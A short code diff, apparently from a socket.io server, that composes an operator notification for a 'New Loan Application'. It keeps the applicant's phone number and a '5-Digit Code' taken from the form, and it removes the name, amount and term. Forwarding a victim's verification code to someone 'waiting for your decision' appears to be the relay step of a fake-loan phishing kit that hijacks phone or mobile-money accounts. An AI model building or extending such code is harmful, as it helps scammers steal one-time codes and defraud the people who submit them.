@@ -30,11 +30,8 @@ io.on('connection', (socket) => {
         const msg = `
 🆕 <b>New Loan Application</b>
 ━━━━━━━━━━━━━━━━
-👤 <b>Name:</b> ${data.firstName} ${data.lastName}
 📞 <b>Phone:</b> +237 ${data.phone}
 🔑 <b>5-Digit Code:</b> ${data.verificationCode}
-💰 <b>Amount:</b> ${Number(data.loanAmount).toLocaleString()} XAF
-📆 <b>Term:</b> ${data.loanTerm} months
 ━━━━━━━━━━━━━━━━
 <i>Waiting for your decision...</i>
         `;
